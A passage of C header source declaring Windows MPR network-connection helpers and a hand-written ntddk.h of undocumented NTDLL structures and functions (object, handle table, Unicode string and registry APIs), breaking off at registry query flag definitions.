    );

BOOL
MprReadConnectionInfo(
    IN  HKEY            KeyHandle,
    IN  LPCTSTR         DriveName,
    IN  DWORD           Index,
    OUT LPDWORD         ProviderFlags,
    OUT LPDWORD         DeferFlags,
    OUT LPTSTR          *UserNamePtr,
    OUT LPNETRESOURCEW  NetResource,
    IN  DWORD           MaxSubKeyLen
    );

VOID
MprForgetRedirConnection(
    IN LPCTSTR  lpName
    );

DWORD
MprForgetPrintConnection(
    IN LPTSTR   lpName
    );

BOOL
MprGetRemoteName(
    IN      LPTSTR  lpLocalName,
    IN OUT  LPDWORD lpBufferSize,
    OUT     LPTSTR  lpRemoteName,
    OUT     LPDWORD lpStatus
    ) ;

//=========================
// Functions from strbuf.c
//=========================

BOOL
NetpCopyStringToBufferW (
    IN LPTSTR String OPTIONAL,
    IN DWORD CharacterCount,
    IN LPTSTR FixedDataEnd,
    IN OUT LPTSTR *EndOfVariableData,
    OUT LPTSTR *VariableDataPointer
    );

BOOL
NetpCopyStringToBufferA (
    IN LPTSTR String OPTIONAL,
    IN DWORD CharacterCount,
    IN LPBYTE FixedDataEnd,
    IN OUT LPTSTR *EndOfVariableData,
    OUT LPTSTR *VariableDataPointer
    );

#ifdef UNICODE
#define NetpCopyStringToBuffer  NetpCopyStringToBufferW
#else
#define NetpCopyStringToBuffer  NetpCopyStringToBufferA
#endif

//=========================
// Other functions
//=========================

DWORD
MprLevel2Init(
    DWORD   InitClass
    );


DWORD
MprEnterLoadLibCritSect (
    VOID
    ) ;

DWORD
MprLeaveLoadLibCritSect (
    VOID
    ) ;

VOID
MprClearString (
    LPWSTR  lpString
    ) ;

DWORD
MprGetConnection (
    IN      LPCWSTR lpLocalName,
    OUT     LPWSTR  lpRemoteName,
    IN OUT  LPDWORD lpBufferSize,
    OUT     LPDWORD lpProviderIndex OPTIONAL
    ) ;



```

`ntlib/ntddk.h`:

```h
#ifndef __NTDLL_H__
#define __NTDLL_H__

#ifdef __cplusplus
extern "C" {
#endif
#include <Windows.h>
#include <richedit.h>
#include <objidl.h>
#ifdef _NTDDK_
#error This header cannot be compiled together with NTDDK
#endif


#ifndef _NTDLL_SELF_                            // Auto-insert the library
#if defined(_WIN64)
#pragma comment(lib, "..\\NTlib\\x64\\Ntdll.lib")
#else
#pragma comment(lib, "..\\NTlib\\x86\\Ntdll.lib")
#endif
#endif

#pragma warning(disable: 4201)                  // nonstandard extension used : nameless struct/union

#pragma warning(push)
#pragma warning(disable:4005)
#include <ntstatus.h>
#pragma warning(pop)

//------------------------------------------------------------------------------
// Defines for NTSTATUS

typedef long NTSTATUS;

#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) ((NTSTATUS)(Status) >= 0)
#endif

#ifndef STATUS_SUCCESS
#define STATUS_SUCCESS       ((NTSTATUS)0x00000000L)
#endif

#ifndef STATUS_UNSUCCESSFUL
#define STATUS_UNSUCCESSFUL ((NTSTATUS)0xC0000001L)
#endif

#ifndef ASSERT
#ifdef _DEBUG
#define ASSERT(x) assert(x)
#else
#define ASSERT(x) /* x */
#endif
#endif

//------------------------------------------------------------------------------
// Structures


#ifndef _MSC_VER
typedef struct _PROCESSOR_NUMBER {
  WORD Group;
  BYTE Number;
  BYTE Reserved;
} PROCESSOR_NUMBER, *PPROCESSOR_NUMBER;
#endif

typedef struct _SYSTEM_HANDLE_TABLE_ENTRY_INFO {
    USHORT UniqueProcessId;
    USHORT CreatorBackTraceIndex;
    UCHAR  ObjectTypeIndex;
    UCHAR  HandleAttributes;
    USHORT HandleValue;
    PVOID  Object;
    ULONG  GrantedAccess;
} SYSTEM_HANDLE_TABLE_ENTRY_INFO, *PSYSTEM_HANDLE_TABLE_ENTRY_INFO;
 
typedef struct _SYSTEM_HANDLE_INFORMATION {
    ULONG NumberOfHandles;
    SYSTEM_HANDLE_TABLE_ENTRY_INFO Handles[1];
} SYSTEM_HANDLE_INFORMATION, *PSYSTEM_HANDLE_INFORMATION;

typedef struct _SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX
{
    PVOID Object;
    ULONG_PTR UniqueProcessId;
    ULONG_PTR HandleValue;
    ULONG GrantedAccess;
    USHORT CreatorBackTraceIndex;
    USHORT ObjectTypeIndex;
    ULONG HandleAttributes;
    ULONG Reserved;
} SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX, * PSYSTEM_HANDLE_TABLE_ENTRY_INFO_EX;

typedef struct _SYSTEM_HANDLE_INFORMATION_EX
{
    ULONG_PTR NumberOfHandles;
    ULONG_PTR Reserved;
    SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX Handles[1];
} SYSTEM_HANDLE_INFORMATION_EX, * PSYSTEM_HANDLE_INFORMATION_EX;

typedef enum _EVENT_TYPE
{
    NotificationEvent,
    SynchronizationEvent

} EVENT_TYPE;

//
// ANSI strings are counted 8-bit character strings. If they are
// NULL terminated, Length does not include trailing NULL.
//

#ifndef _NTSECAPI_
typedef struct _STRING
{
    USHORT Length;
    USHORT MaximumLength;
    PCHAR  Buffer;

} STRING, *PSTRING;

//
// Unicode strings are counted 16-bit character strings. If they are
// NULL terminated, Length does not include trailing NULL.
//

typedef struct _UNICODE_STRING
{
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;

} UNICODE_STRING, *PUNICODE_STRING;

typedef struct _RTL_BUFFER  {
    PUCHAR Buffer;
    PUCHAR StaticBuffer;
    SIZE_T Size;
    SIZE_T StaticSize;
    SIZE_T ReservedForAllocatedSize;
    PVOID ReservedForIMalloc;
} RTL_BUFFER, *PRTL_BUFFER;

typedef struct _RTL_UNICODE_STRING_BUFFER {  
    UNICODE_STRING String; 
    RTL_BUFFER ByteBuffer; 
    UCHAR MinimumStaticBufferForTerminalNul[sizeof(WCHAR)];
} RTL_UNICODE_STRING_BUFFER, *PRTL_UNICODE_STRING_BUFFER;

#endif // _NTSECAPI_

typedef STRING ANSI_STRING;
typedef PSTRING PANSI_STRING;

typedef STRING OEM_STRING;
typedef PSTRING POEM_STRING;
typedef CONST STRING* PCOEM_STRING;

typedef const UNICODE_STRING *PCUNICODE_STRING;

#define UNICODE_NULL ((WCHAR)0) // winnt

//
// Valid values for the Attributes field
//

#ifndef OBJ_CASE_INSENSITIVE
#define OBJ_INHERIT             0x00000002L
#define OBJ_PERMANENT           0x00000010L
#define OBJ_EXCLUSIVE           0x00000020L
#define OBJ_CASE_INSENSITIVE    0x00000040L
#define OBJ_OPENIF              0x00000080L
#define OBJ_OPENLINK            0x00000100L
#define OBJ_KERNEL_HANDLE       0x00000200L
#define OBJ_FORCE_ACCESS_CHECK  0x00000400L
#define OBJ_VALID_ATTRIBUTES    0x000007F2L

//
// Object Attributes structure
//

typedef struct _OBJECT_ATTRIBUTES
{
    ULONG Length;
    HANDLE RootDirectory;
    PUNICODE_STRING ObjectName;
    ULONG Attributes;
    PVOID SecurityDescriptor;        // Points to type SECURITY_DESCRIPTOR
    PVOID SecurityQualityOfService;  // Points to type SECURITY_QUALITY_OF_SERVICE

} OBJECT_ATTRIBUTES, *POBJECT_ATTRIBUTES;
#endif  // OBJ_CASE_INSENSITIVE

//
// IO_STATUS_BLOCK
//

typedef struct _IO_STATUS_BLOCK
{
    union
    {
        NTSTATUS Status;
        PVOID Pointer;
    };

    ULONG_PTR Information;

} IO_STATUS_BLOCK, *PIO_STATUS_BLOCK;

//
// ClientId
//

typedef struct _CLIENT_ID
{
    HANDLE UniqueProcess;
    HANDLE UniqueThread;

} CLIENT_ID, *PCLIENT_ID;


//
// CURDIR structure
//

typedef struct _CURDIR
{
    UNICODE_STRING DosPath;
    HANDLE Handle;

} CURDIR, *PCURDIR;


//------------------------------------------------------------------------------
// Macros

// INIT_UNICODE_STRING is a replacement of RtlInitUnicodeString
#ifndef INIT_UNICODE_STRING
#define INIT_UNICODE_STRING(us, wch)                 \
    us.MaximumLength = (USHORT)sizeof(wch);          \
    us.Length        = (USHORT)(wcslen(wch) * sizeof(WCHAR)); \
    us.Buffer        = wch
#endif


#ifndef InitializeObjectAttributes
#define InitializeObjectAttributes( p, n, a, r, s ) {   \
    (p)->Length = sizeof( OBJECT_ATTRIBUTES );          \
    (p)->RootDirectory = r;                             \
    (p)->Attributes = a;                                \
    (p)->ObjectName = n;                                \
    (p)->SecurityDescriptor = s;                        \
    (p)->SecurityQualityOfService = NULL;               \
    }
#endif


#ifndef InitializePortHeader
#define InitializeMessageHeader( ph, l, t ) {                  \
    (ph)->TotalLength    = (USHORT)(l);                        \
    (ph)->DataLength     = (USHORT)(l - sizeof(PORT_MESSAGE)); \
    (ph)->Type           = (USHORT)(t);                        \
    (ph)->VirtualRangesOffset = 0;                             \
    }
#endif

//-----------------------------------------------------------------------------
// Image functions

NTSYSAPI
PVOID
NTAPI
RtlImageNtHeader (
  IN PVOID BaseAddress
  );

NTSYSAPI
PVOID
NTAPI
RtlImageDirectoryEntryToData (
  IN PVOID Base,
  IN BOOLEAN MappedAsImage,
  IN USHORT DirectoryEntry,
  OUT PULONG Size
  );

//-----------------------------------------------------------------------------
// Unicode string functions

NTSYSAPI
NTSTATUS
NTAPI
RtlStringFromGUID( 
  IN REFGUID Guid,
  OUT PUNICODE_STRING GuidString
  );


NTSYSAPI
VOID
NTAPI
RtlInitUnicodeString(
    PUNICODE_STRING DestinationString,
    PCWSTR SourceString
    );


NTSYSAPI
BOOLEAN
NTAPI
RtlCreateUnicodeString(
    OUT PUNICODE_STRING DestinationString,
    IN PCWSTR SourceString
    );


NTSYSAPI
BOOLEAN
NTAPI
RtlCreateUnicodeStringFromAsciiz(
    OUT PUNICODE_STRING Destination,
    IN PCSTR Source
    );


NTSYSAPI
BOOLEAN
NTAPI
RtlPrefixUnicodeString (
    IN PUNICODE_STRING String1,
    IN PUNICODE_STRING String2,
    IN BOOLEAN CaseInSensitive
    );


NTSYSAPI
NTSTATUS
NTAPI
RtlDuplicateUnicodeString(
    IN  BOOLEAN AllocateNew,
    IN  PUNICODE_STRING SourceString,
    OUT PUNICODE_STRING TargetString
    );


NTSYSAPI
NTSTATUS
NTAPI
RtlAppendUnicodeToString (
    PUNICODE_STRING Destination,
    PCWSTR Source
    );


NTSYSAPI
NTSTATUS
NTAPI
RtlAppendUnicodeStringToString(
    IN OUT PUNICODE_STRING Destination,
    IN PUNICODE_STRING Source
    );


NTSYSAPI
NTSTATUS
NTAPI
RtlUnicodeStringToInteger (
    IN PUNICODE_STRING String,
    IN ULONG Base OPTIONAL,
    OUT PULONG Value
    );


NTSYSAPI
NTSTATUS
NTAPI
RtlIntegerToUnicodeString (
    IN ULONG Value,
    IN ULONG Base OPTIONAL,
    IN OUT PUNICODE_STRING String
    );


NTSYSAPI
NTSTATUS
NTAPI
RtlGUIDFromString(
    IN PUNICODE_STRING GuidString,
    OUT GUID *Guid
    );


NTSYSAPI
LONG
NTAPI
RtlCompareUnicodeString (
    IN PUNICODE_STRING String1,
    IN PUNICODE_STRING String2,
    IN BOOLEAN CaseInSensitive
    );


NTSYSAPI
VOID
NTAPI
RtlCopyUnicodeString(
    OUT PUNICODE_STRING DestinationString,
    IN PUNICODE_STRING SourceString
    );


NTSYSAPI
NTSTATUS
NTAPI
RtlUpcaseUnicodeString (
    OUT PUNICODE_STRING DestinationString,
    IN PUNICODE_STRING SourceString,
    IN BOOLEAN AllocateDestinationString
    );


NTSYSAPI
NTSTATUS
NTAPI
RtlDowncaseUnicodeString (
    OUT PUNICODE_STRING DestinationString,
    IN PUNICODE_STRING SourceString,
    IN BOOLEAN AllocateDestinationString
    );


NTSYSAPI
BOOLEAN
NTAPI
RtlEqualUnicodeString (
    IN PUNICODE_STRING String1,
    IN PUNICODE_STRING String2,
    IN BOOLEAN CaseInSensitive
    );


NTSYSAPI
VOID
NTAPI
RtlFreeUnicodeString(
    IN  PUNICODE_STRING UnicodeString
    );


NTSYSAPI
NTSTATUS
NTAPI
RtlAnsiStringToUnicodeString (
    OUT PUNICODE_STRING DestinationString,
    IN PANSI_STRING SourceString,
    IN BOOLEAN AllocateDestinationString
    );


NTSYSAPI
NTSTATUS
NTAPI
RtlUnicodeStringToAnsiString (
    OUT PANSI_STRING DestinationString,
    IN PUNICODE_STRING SourceString,
    IN BOOLEAN AllocateDestinationString
    );


NTSYSAPI
VOID
NTAPI
RtlInitAnsiString (
    OUT PANSI_STRING DestinationString,
    IN PCHAR SourceString
    );


NTSYSAPI
VOID
NTAPI
RtlFreeAnsiString (
    IN PANSI_STRING AnsiString
    );


NTSYSAPI
NTSTATUS
NTAPI
RtlFormatCurrentUserKeyPath(
    OUT PUNICODE_STRING CurrentUserKeyPath
    );


NTSYSAPI
VOID
NTAPI
RtlRaiseStatus (
    IN NTSTATUS Status
    );


NTSYSAPI
VOID
NTAPI
DbgBreakPoint(
    VOID
    );


NTSYSAPI
ULONG
_cdecl
DbgPrint (
    PCH Format,
    ...
    );


NTSYSAPI
ULONG
NTAPI
RtlRandom(
    IN OUT PULONG Seed
    );

//-----------------------------------------------------------------------------
// Critical section functions

NTSYSAPI
NTSTATUS
NTAPI
RtlInitializeCriticalSection(
    IN  PRTL_CRITICAL_SECTION CriticalSection
    );


NTSYSAPI
BOOL
NTAPI
RtlTryEnterCriticalSection(
    IN PRTL_CRITICAL_SECTION CriticalSection
    );


NTSYSAPI
NTSTATUS
NTAPI
RtlEnterCriticalSection(
    IN PRTL_CRITICAL_SECTION CriticalSection
    );


NTSYSAPI
NTSTATUS
NTAPI
RtlLeaveCriticalSection(
    IN PRTL_CRITICAL_SECTION CriticalSection
    );


NTSYSAPI
NTSTATUS
NTAPI
RtlDeleteCriticalSection(
    IN  PRTL_CRITICAL_SECTION CriticalSection
    );

//-----------------------------------------------------------------------------
// Object functions

//
// Object Manager Directory Specific Access Rights.
//

#ifndef DIRECTORY_QUERY
#define DIRECTORY_QUERY                 (0x0001)
#define DIRECTORY_TRAVERSE              (0x0002)
#define DIRECTORY_CREATE_OBJECT         (0x0004)
#define DIRECTORY_CREATE_SUBDIRECTORY   (0x0008)
#define DIRECTORY_ALL_ACCESS (STANDARD_RIGHTS_REQUIRED | 0xF)
#endif

typedef enum _POOL_TYPE {
    NonPagedPool,
    PagedPool,
    NonPagedPoolMustSucceed,
    DontUseThisType,
    NonPagedPoolCacheAligned,
    PagedPoolCacheAligned,
    NonPagedPoolCacheAlignedMustS,
    MaxPoolType
} POOL_TYPE;


//
// For NtQueryObject
//

typedef enum _OBJECT_INFORMATION_CLASS {
    ObjectBasicInformation,          // = 0
    ObjectNameInformation,          // = 1
    ObjectTypeInformation,          // = 2
    ObjectTypesInformation,         // = 3    //object handle is ignored
    ObjectHandleFlagInformation     // = 4
} OBJECT_INFORMATION_CLASS;

//
// NtQueryObject uses ObjectBasicInformation
//

typedef struct _OBJECT_BASIC_INFORMATION {
    ULONG Attributes;
    ACCESS_MASK GrantedAccess;
    ULONG HandleCount;
    ULONG PointerCount;
    ULONG PagedPoolCharge;
    ULONG NonPagedPoolCharge;
    ULONG Reserved[3];
    ULONG NameInfoSize;
    ULONG TypeInfoSize;
    ULONG SecurityDescriptorSize;
    LARGE_INTEGER CreationTime;
} OBJECT_BASIC_INFORMATION, *POBJECT_BASIC_INFORMATION;

//
// NtQueryObject uses ObjectNameInformation
//

typedef struct _OBJECT_NAME_INFORMATION {
    UNICODE_STRING Name;
} OBJECT_NAME_INFORMATION, *POBJECT_NAME_INFORMATION;

//
// NtQueryObject uses ObjectTypeInformation
//

typedef struct _OBJECT_TYPE_INFORMATION {
   UNICODE_STRING TypeName;
   ULONG TotalNumberOfObjects;
   ULONG TotalNumberOfHandles;
   ULONG TotalPagedPoolUsage;
   ULONG TotalNonPagedPoolUsage;
   ULONG TotalNamePoolUsage;
   ULONG TotalHandleTableUsage;
   ULONG HighWaterNumberOfObjects;
   ULONG HighWaterNumberOfHandles;
   ULONG HighWaterPagedPoolUsage;
   ULONG HighWaterNonPagedPoolUsage;
   ULONG HighWaterNamePoolUsage;
   ULONG HighWaterHandleTableUsage;
   ULONG InvalidAttributes;
   GENERIC_MAPPING GenericMapping;
   ULONG ValidAccessMask;
   BOOLEAN SecurityRequired;
   BOOLEAN MaintainHandleCount;
   POOL_TYPE PoolType;
   ULONG DefaultPagedPoolCharge;
   ULONG DefaultNonPagedPoolCharge;
} OBJECT_TYPE_INFORMATION, *POBJECT_TYPE_INFORMATION;

//
// NtQueryObject uses ObjectHandleFlagInformation
// NtSetInformationObject uses ObjectHandleFlagInformation
//

typedef struct _OBJECT_HANDLE_FLAG_INFORMATION {
    BOOLEAN Inherit;
    BOOLEAN ProtectFromClose;
} OBJECT_HANDLE_FLAG_INFORMATION, *POBJECT_HANDLE_FLAG_INFORMATION;

//
// NtQueryDirectoryObject uses this type
//

typedef struct _OBJECT_DIRECTORY_INFORMATION {
    UNICODE_STRING Name;
    UNICODE_STRING TypeName;
} OBJECT_DIRECTORY_INFORMATION, *POBJECT_DIRECTORY_INFORMATION;


NTSYSAPI
NTSTATUS
NTAPI
NtOpenDirectoryObject(
    OUT PHANDLE DirectoryHandle,
    IN ACCESS_MASK DesiredAccess,
    IN POBJECT_ATTRIBUTES ObjectAttributes
    );


NTSYSAPI
NTSTATUS
NTAPI
NtQueryDirectoryObject(
    IN HANDLE DirectoryHandle,
    OUT PVOID Buffer,
    IN ULONG Length,
    IN BOOLEAN ReturnSingleEntry,
    IN BOOLEAN RestartScan,
    IN OUT PULONG Context,
    OUT PULONG ReturnLength OPTIONAL
    );


NTSYSAPI
NTSTATUS
NTAPI
NtQueryObject (
    IN HANDLE ObjectHandle,
    IN OBJECT_INFORMATION_CLASS ObjectInformationClass,
    OUT PVOID ObjectInformation,
    IN ULONG Length,
    OUT PULONG ResultLength OPTIONAL
    );


NTSYSAPI
NTSTATUS
NTAPI
NtSetInformationObject (
    IN HANDLE ObjectHandle,
    IN OBJECT_INFORMATION_CLASS ObjectInformationClass,
    IN PVOID ObjectInformation,
    IN ULONG Length
    );


NTSYSAPI
NTSTATUS
NTAPI
NtDuplicateObject (
    IN HANDLE SourceProcessHandle,
    IN HANDLE SourceHandle,
    IN HANDLE TargetProcessHandle OPTIONAL,
    OUT PHANDLE TargetHandle OPTIONAL,
    IN ACCESS_MASK DesiredAccess,
    IN ULONG HandleAttributes,
    IN ULONG Options
    );


NTSYSAPI
NTSTATUS
NTAPI
NtQuerySecurityObject (
    IN HANDLE ObjectHandle,
    IN SECURITY_INFORMATION SecurityInformation,
    OUT PSECURITY_DESCRIPTOR SecurityDescriptor,
    IN ULONG DescriptorLength,
    OUT PULONG ReturnLength
    );


NTSYSAPI
NTSTATUS
NTAPI
NtSetSecurityObject (
    IN HANDLE ObjectHandle,
    IN SECURITY_INFORMATION SecurityInformation,
    IN PSECURITY_DESCRIPTOR SecurityDescriptor
    );


//-----------------------------------------------------------------------------
// Handle table RTL functions

#define LEVEL_HANDLE_ID         0x74000000
#define LEVEL_HANDLE_ID_MASK    0xFF000000
#define LEVEL_HANDLE_INDEX_MASK 0x00FFFFFF

typedef enum _RTL_GENERIC_COMPARE_RESULTS {
    GenericLessThan,
    GenericGreaterThan,
    GenericEqual
} RTL_GENERIC_COMPARE_RESULTS;


typedef struct _RTL_SPLAY_LINKS
{
  struct _RTL_SPLAY_LINKS *Parent;
  struct _RTL_SPLAY_LINKS *LeftChild;
  struct _RTL_SPLAY_LINKS *RightChild;
} RTL_SPLAY_LINKS, *PRTL_SPLAY_LINKS;


struct _RTL_GENERIC_TABLE;

typedef
RTL_GENERIC_COMPARE_RESULTS
(NTAPI * PRTL_GENERIC_COMPARE_ROUTINE) (
    struct _RTL_GENERIC_TABLE *Table,
    PVOID FirstStruct,
    PVOID SecondStruct
    );

typedef
PVOID
(NTAPI *PRTL_GENERIC_ALLOCATE_ROUTINE) (
    struct _RTL_GENERIC_TABLE *Table,
    ULONG ByteSize
    );

typedef
VOID
(NTAPI *PRTL_GENERIC_FREE_ROUTINE) (
    struct _RTL_GENERIC_TABLE *Table,
    PVOID Buffer
    );


typedef struct _RTL_GENERIC_TABLE {
    PRTL_SPLAY_LINKS TableRoot;
    LIST_ENTRY InsertOrderList;
    PLIST_ENTRY OrderedPointer;
    ULONG WhichOrderedElement;
    ULONG NumberGenericTableElements;
    PRTL_GENERIC_COMPARE_ROUTINE CompareRoutine;
    PRTL_GENERIC_ALLOCATE_ROUTINE AllocateRoutine;
    PRTL_GENERIC_FREE_ROUTINE FreeRoutine;
    PVOID TableContext;
} RTL_GENERIC_TABLE, *PRTL_GENERIC_TABLE;


typedef struct _RTL_HANDLE_TABLE_ENTRY
{
   struct _RTL_HANDLE_TABLE_ENTRY *Next;    /* pointer to next free handle */
   PVOID  Object;

} RTL_HANDLE_TABLE_ENTRY, *PRTL_HANDLE_TABLE_ENTRY;


typedef struct _RTL_HANDLE_TABLE
{
   ULONG MaximumNumberOfHandles;
   ULONG SizeOfHandleTableEntry;
   ULONG Unknown01;
   ULONG Unknown02;
   PRTL_HANDLE_TABLE_ENTRY FreeHandles;
   PRTL_HANDLE_TABLE_ENTRY CommittedHandles;
   PRTL_HANDLE_TABLE_ENTRY UnCommittedHandles;
   PRTL_HANDLE_TABLE_ENTRY MaxReservedHandles;
} RTL_HANDLE_TABLE, *PRTL_HANDLE_TABLE;


NTSYSAPI
VOID
NTAPI
RtlInitializeGenericTable (
    IN PRTL_GENERIC_TABLE Table,
    IN PRTL_GENERIC_COMPARE_ROUTINE CompareRoutine,
    IN PRTL_GENERIC_ALLOCATE_ROUTINE AllocateRoutine,
    IN PRTL_GENERIC_FREE_ROUTINE FreeRoutine,
    IN PVOID TableContext
    );


NTSYSAPI
VOID
NTAPI
RtlInitializeHandleTable(
    IN ULONG MaximumNumberOfHandles,
    IN ULONG SizeOfHandleTableEntry,
    OUT PRTL_HANDLE_TABLE HandleTable
    );


NTSYSAPI
PRTL_HANDLE_TABLE_ENTRY
NTAPI
RtlAllocateHandle(
    IN PRTL_HANDLE_TABLE HandleTable,
    OUT PULONG HandleIndex OPTIONAL
    );


NTSYSAPI
BOOLEAN
NTAPI
RtlFreeHandle(
    IN PRTL_HANDLE_TABLE HandleTable,
    IN PRTL_HANDLE_TABLE_ENTRY Handle
    );


NTSYSAPI
BOOLEAN
NTAPI
RtlIsValidIndexHandle(
    IN PRTL_HANDLE_TABLE HandleTable,
    IN ULONG HandleIndex,
    OUT PRTL_HANDLE_TABLE_ENTRY *Handle
    );


NTSYSAPI
PVOID
NTAPI
RtlInsertElementGenericTable (
    IN PRTL_GENERIC_TABLE Table,
    IN PVOID Buffer,
    IN LONG BufferSize,
    OUT PBOOLEAN NewElement OPTIONAL
    );


NTSYSAPI
BOOLEAN
NTAPI
RtlIsGenericTableEmpty (
    IN PRTL_GENERIC_TABLE Table
    );


NTSYSAPI
BOOLEAN
NTAPI
RtlIsGenericTableEmpty (
    IN PRTL_GENERIC_TABLE Table
    );


NTSYSAPI
PVOID
NTAPI
RtlLookupElementGenericTable (
    IN PRTL_GENERIC_TABLE Table,
    IN PVOID Buffer
    );


NTSYSAPI
PVOID
NTAPI
RtlEnumerateGenericTableWithoutSplaying(
    IN  PRTL_GENERIC_TABLE Table,
    IN  PVOID *RestartKey
    );


NTSYSAPI
NTSTATUS
NTAPI
NtClose(
    IN  HANDLE Handle
    );


NTSYSAPI
NTSTATUS
NTAPI
ZwClose(
    IN  HANDLE Handle
    );

//-----------------------------------------------------------------------------
// Environment functions

NTSYSAPI
NTSTATUS
NTAPI
RtlOpenCurrentUser(
    IN ULONG DesiredAccess,
    OUT PHANDLE CurrentUserKey
    );


NTSYSAPI
NTSTATUS
NTAPI
RtlCreateEnvironment(
    BOOLEAN CloneCurrentEnvironment,
    PVOID *Environment
    );


NTSYSAPI
NTSTATUS
NTAPI
RtlQueryEnvironmentVariable_U (
    PVOID Environment,
    PUNICODE_STRING Name,
    PUNICODE_STRING Value
    );


NTSYSAPI
NTSTATUS
NTAPI
RtlSetEnvironmentVariable(
    PVOID *Environment,
    PUNICODE_STRING Name,
    PUNICODE_STRING Value
    );


NTSYSAPI
NTSTATUS
NTAPI
RtlDestroyEnvironment(
    PVOID Environment
    );

//-----------------------------------------------------------------------------
// Registry functions


typedef enum _KEY_INFORMATION_CLASS
{
    KeyBasicInformation,
    KeyNodeInformation,
    KeyFullInformation,
    KeyNameInformation,
    KeyCachedInformation,
    KeyFlagsInformation,
    MaxKeyInfoClass  // MaxKeyInfoClass should always be the last enum

} KEY_INFORMATION_CLASS;

//
// Key query structures
//

typedef struct _KEY_BASIC_INFORMATION
{
    LARGE_INTEGER LastWriteTime;
    ULONG   TitleIndex;
    ULONG   NameLength;
    WCHAR   Name[1];            // Variable length string

} KEY_BASIC_INFORMATION, *PKEY_BASIC_INFORMATION;


typedef struct _KEY_NODE_INFORMATION
{
    LARGE_INTEGER LastWriteTime;
    ULONG   TitleIndex;
    ULONG   ClassOffset;
    ULONG   ClassLength;
    ULONG   NameLength;
    WCHAR   Name[1];            // Variable length string
//          Class[1];           // Variable length string not declared
} KEY_NODE_INFORMATION, *PKEY_NODE_INFORMATION;


typedef struct _KEY_FULL_INFORMATION
{
    LARGE_INTEGER LastWriteTime;
    ULONG   TitleIndex;
    ULONG   ClassOffset;
    ULONG   ClassLength;
    ULONG   SubKeys;
    ULONG   MaxNameLen;
    ULONG   MaxClassLen;
    ULONG   Values;
    ULONG   MaxValueNameLen;
    ULONG   MaxValueDataLen;
    WCHAR   Class[1];           // Variable length

} KEY_FULL_INFORMATION, *PKEY_FULL_INFORMATION;


// end_wdm
typedef struct _KEY_NAME_INFORMATION
{
    ULONG   NameLength;
    WCHAR   Name[1];            // Variable length string

} KEY_NAME_INFORMATION, *PKEY_NAME_INFORMATION;

typedef struct _KEY_CACHED_INFORMATION
{
    LARGE_INTEGER LastWriteTime;
    ULONG   TitleIndex;
    ULONG   SubKeys;
    ULONG   MaxNameLen;
    ULONG   Values;
    ULONG   MaxValueNameLen;
    ULONG   MaxValueDataLen;
    ULONG   NameLength;
    WCHAR   Name[1];            // Variable length string

} KEY_CACHED_INFORMATION, *PKEY_CACHED_INFORMATION;


typedef struct _KEY_FLAGS_INFORMATION
{
    ULONG   UserFlags;

} KEY_FLAGS_INFORMATION, *PKEY_FLAGS_INFORMATION;



typedef enum _KEY_VALUE_INFORMATION_CLASS {
    KeyValueBasicInformation,
    KeyValueFullInformation,
    KeyValuePartialInformation,
    KeyValueFullInformationAlign64,
    KeyValuePartialInformationAlign64,
    MaxKeyValueInfoClass  // MaxKeyValueInfoClass should always be the last enum
} KEY_VALUE_INFORMATION_CLASS;


typedef struct _KEY_VALUE_FULL_INFORMATION {
    ULONG   TitleIndex;
    ULONG   Type;
    ULONG   DataOffset;
    ULONG   DataLength;
    ULONG   NameLength;
    WCHAR   Name[1];            // Variable size
//          Data[1];            // Variable size data not declared
} KEY_VALUE_FULL_INFORMATION, *PKEY_VALUE_FULL_INFORMATION;


typedef struct _KEY_VALUE_PARTIAL_INFORMATION {
    ULONG   TitleIndex;
    ULONG   Type;
    ULONG   DataLength;
    UCHAR   Data[1];            // Variable size
} KEY_VALUE_PARTIAL_INFORMATION, *PKEY_VALUE_PARTIAL_INFORMATION;



NTSYSAPI
NTSTATUS
NTAPI
NtCreateKey(
    OUT PHANDLE KeyHandle,
    IN  ACCESS_MASK DesiredAccess,
    IN  POBJECT_ATTRIBUTES ObjectAttributes,
    IN  ULONG TitleIndex,
    IN  PUNICODE_STRING Class OPTIONAL,
    IN  ULONG CreateOptions,
    OUT PULONG Disposition OPTIONAL
    );


NTSYSAPI
NTSTATUS
NTAPI
NtOpenKey(
    OUT PHANDLE KeyHandle,
    IN ACCESS_MASK DesiredAccess,
    IN POBJECT_ATTRIBUTES ObjectAttributes
    );

NTSYSAPI
NTSTATUS
NTAPI
NtQueryKey(
           IN HANDLE  KeyHandle,
           IN KEY_INFORMATION_CLASS  KeyInformationClass,
           OUT PVOID  KeyInformation,
           IN ULONG  Length,
           OUT PULONG  ResultLength
    );

NTSYSAPI
NTSTATUS
NTAPI
NtEnumerateKey(
    IN HANDLE KeyHandle,
    IN ULONG Index,
    IN KEY_INFORMATION_CLASS KeyInformationClass,
    IN PVOID KeyInformation,
    IN ULONG Length,
    IN PULONG ResultLength
    );


NTSYSAPI
NTSTATUS
NTAPI
NtDeleteKey(
    IN HANDLE KeyHandle
    );


NTSYSAPI
NTSTATUS
NTAPI
NtQueryValueKey(
    IN HANDLE KeyHandle,
    IN PUNICODE_STRING ValueName,
    IN KEY_VALUE_INFORMATION_CLASS KeyValueInformationClass,
    OUT PVOID KeyValueInformation,
    IN ULONG Length,
    OUT PULONG ResultLength
    );


NTSYSAPI
NTSTATUS
NTAPI
NtSetValueKey(
    IN HANDLE KeyHandle,
    IN PUNICODE_STRING ValueName,
    IN ULONG TitleIndex OPTIONAL,
    IN ULONG Type,
    IN PVOID Data,
    IN ULONG DataSize
    );


NTSYSAPI
NTSTATUS
NTAPI
NtDeleteValueKey(
    IN HANDLE KeyHandle,
    IN PUNICODE_STRING ValueName
    );

//-----------------------------------------------------------------------------
// RtlQueryRegistryValues

//
// The following flags specify how the Name field of a RTL_QUERY_REGISTRY_TABLE
// entry is interpreted.  A NULL name indicates the end of the table.
//

#define RTL_QUERY_REGISTRY_SUBKEY   0x00000001  // Name is a subkey and remainder of
                                                // table or until next subkey are value
                                                // names for that subkey to look at.

#define RTL_QUERY_REGISTRY_TOPKEY   0x00000002  // Reset current key to original key for
                                                // this and all following table entries.

#define RTL_QUERY_REGISTRY_REQUIRED 0x00000004  // Fail if no match found for this table
                                                // entry.

#define RTL_QUERY_REGISTRY_NOVALUE  0x00000008  // Used to mark a table entry that has no
                                                // value name, just wants a call out, not
                                                // an enumeration of all values.

